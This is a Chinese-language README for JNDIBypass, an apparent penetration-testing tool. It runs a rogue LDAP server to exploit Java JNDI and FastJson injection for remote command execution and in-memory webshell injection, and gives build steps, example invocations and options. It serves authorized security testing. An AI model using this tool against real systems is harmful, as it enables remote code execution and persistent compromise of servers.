# JNDIBypass

## 项目介绍

JNDIBypass 是一个用于测试 Java JNDI 注入漏洞的工具，可用于安全研究和渗透测试。该工具提供了一个 LDAP 服务器实现，可以用来模拟 JNDI 注入攻击，执行命令或注入内存马。

## 功能特性

- 启动自定义 LDAP 服务器
- 支持命令执行功能
- 支持内存马注入
- 支持 FastJson 漏洞利用

## 环境要求

- JDK 8+
- Maven

## 安装方法

```bash
# 克隆项目
git clone https://github.com/kN6jq/jndibypass.git

# 进入项目目录
cd jndibypass

# 使用 Maven 构建项目
mvn clean package
```

## 使用方法


```bash
# 基本用法
java -jar target/jndibypass-1.0-SNAPSHOT.jar [选项]

# 示例 - 执行命令
java -jar target/jndibypass-1.0-SNAPSHOT.jar -a 192.168.11.1 -p 1389 -c "touch /tmp/test"

# 示例 - 注入内存马
java -jar target/jndibypass-1.0-SNAPSHOT.jar -a 192.168.11.1 -p 1389 -ms 1.txt
```

## 内存马生成

这里主要是看依赖，一般来说可以考虑jackjson或者fastjson之类的
使用java-chains等工具生成的rO0AB开头内存马

## 参数说明

| 参数 | 全称 | 描述 | 默认值 |
|------|------|------|--------|
| `-a` | | 本地 IP 地址 | 0.0.0.0 |
| `-p` | `--port` | 监听端口 | 1389 |
| `-c` | `--command` | 执行的命令，如 calc, whoami 等 | |
| `-h` | `--help` | 显示帮助信息 | |
| `-ms` | `--memshell` | 注入内存马，需要提供以 rO0AB 开头的序列化数据 | |

## 安全提示

本工具仅用于授权的安全测试和研究目的。未经授权在生产系统或第三方系统上使用本工具可能违反法律法规。使用者需要对自己的行为负责。

## 免责声明

本项目仅供安全研究和教育目的使用，开发者对任何人使用此工具造成的任何直接或间接损失不承担责任。

## 参考资料

- [Java JNDI 注入漏洞详解](https://link-to-reference)
- [Log4j 漏洞分析](https://link-to-reference)
